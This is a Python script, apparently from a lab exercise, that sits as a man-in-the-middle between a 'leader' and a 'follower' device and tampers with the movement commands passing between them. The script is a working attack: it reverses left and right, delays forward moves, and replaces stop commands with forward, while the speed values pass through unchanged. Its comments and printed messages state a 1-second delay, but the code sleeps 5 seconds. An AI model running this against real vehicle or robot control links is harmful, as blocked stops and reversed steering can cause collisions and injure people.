import socket
import threading
import time

def handle_leader_to_follower(leader_conn, follower_conn):
    try:
        while True:
            data = leader_conn.recv(1024)
            if not data:
                print("Leader disconnected")
                break
            
            original_data = data.decode('utf-8')
            print(f"Original data: {original_data}")
            
            # Parse the data
            try:
                leader_speed, key = original_data.split(',')
                # We'll keep the original speed and only manipulate the key
                
                # Manipulate the direction key only
                manipulated_key = manipulate_direction(key)
                
                # Create modified data with original speed
                modified_data = f"{leader_speed},{manipulated_key}"
                
                print(f"Leader → Follower: {original_data} → {modified_data}")
                
                # Send the manipulated data
                follower_conn.sendall(modified_data.encode('utf-8'))
            except Exception as e:
                print(f"Error processing data: {e}")
                # Forward original data if parsing fails
                follower_conn.sendall(data)
    except Exception as e:
        print(f"Leader-to-follower error: {e}")

def manipulate_direction(key):
    """
    Manipulate only the direction command sent from leader to follower.
    Speed remains unchanged.
    """
    # === EXAMPLES OF DIRECTION MANIPULATION ===
    
    # Example 1: Reverse directions
    if key == 'a':
        return 'd'  # Change left to right
    elif key == 'd':
        return 'a'  # Change right to left
    
    # Example 2: Delay certain commands
    if key == 'w':
        time.sleep(5)  # Add a 1-second delay to forward movement
    
    # Example 3: Block stopping
    if key == 'f':
        return 'w'  # Replace stop with forward
    
    
    # Example 5: Random directions (uncomment to enable)
    # import random
    # if random.random() < 0.3:  # 30% chance to override command
    #     commands = ['w', 's', 'a', 'd']
    #     return random.choice(commands)
    
    # Default: Pass through unchanged
    return key
        
def start_mitm():
    # Connect to the leader
    leader_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("MITM connecting to leader...")
    try:
        leader_socket.connect(('192.168.1.30', 12345))  # Connect to leader's IP
        print("Connected to leader")
    except Exception as e:
        print(f"Failed to connect to leader: {e}")
        return
    
    # Accept connection from the follower
    follower_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    follower_server.bind(('0.0.0.0', 12346))
    follower_server.listen(1)
    print("MITM waiting for follower connection...")
    
    follower_conn, follower_addr = follower_server.accept()
    print(f"Follower connected from {follower_addr}")
    
    print("\n=== MITM ATTACK ACTIVE ===")
    print("Currently manipulating: Direction commands only")
    print("Active manipulations:")
    print("- Left/Right directions reversed")
    print("- Forward movement delayed by 1 second")
    print("- Stop commands replaced with forward")
    print("Edit the manipulate_direction() function to change behavior")
    
    # Start thread to handle communication from leader to follower
    threading.Thread(target=handle_leader_to_follower, args=(leader_socket, follower_conn)).start()

if __name__ == "__main__":
    start_mitm()